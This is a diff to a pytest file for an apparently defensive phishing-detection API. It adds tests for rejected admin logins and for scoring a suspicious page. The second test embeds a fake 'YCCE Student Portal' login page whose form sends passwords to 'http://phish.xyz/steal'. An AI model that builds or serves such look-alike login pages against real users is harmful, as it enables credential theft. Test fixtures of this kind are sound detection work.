@@ -155,7 +155,7 @@ async def test_official_safe_page_scoring():
         assert data["status"] == "TRUSTED"
         assert data["risk_score"] <= 15
         assert data["recommendation"] == "ALLOW"
-        assert any("Verified official domain" in r for r in data["reasons"])
+        assert any("Verified official" in r for r in data["reasons"])
 
 
 @pytest.mark.asyncio
@@ -203,6 +203,38 @@ async def test_reason_consistency_on_elevated_risk():
     safe_contribs = {}
     safe_reasons = generate_reasons(safe_fused, safe_contribs, red_flags=[], risk_score=5.0)
     assert any("Verified official domain" in r for r in safe_reasons)
+
+
+@pytest.mark.asyncio
+async def test_auth_invalid_credentials():
+    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
+        # Invalid email / attacker attempt
+        res = await ac.post("/api/auth/login", json={"email": "attacker@evil.com", "password": "anypassword"})
+        assert res.status_code == 401
+        assert "Invalid Admin ID or Password" in res.json()["detail"]
+
+        # Valid admin email with wrong password
+        res2 = await ac.post("/api/auth/login", json={"email": "admin@ycce.edu.in", "password": "wrong_password_123"})
+        assert res2.status_code == 401
+        assert "Invalid Admin ID or Password" in res2.json()["detail"]
+
+
+@pytest.mark.asyncio
+async def test_analyze_explicit_twin_target():
+    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as ac:
+        html_content = "<html><head><title>YCCE Student Portal</title></head><body><form action='http://phish.xyz/steal'><input type='password'/><button>Sign In</button></form></body></html>"
+        res = await ac.post(
+            "/api/analyze",
+            json={
+                "url": "http://fake-ycce-portal.xyz/login",
+                "html": html_content,
+                "twin_domain": "ycce.edu",
+            }
+        )
+        assert res.status_code == 200
+        data = res.json()
+        assert data["risk_score"] > 0
+        assert "recommendation" in data
 
 
 
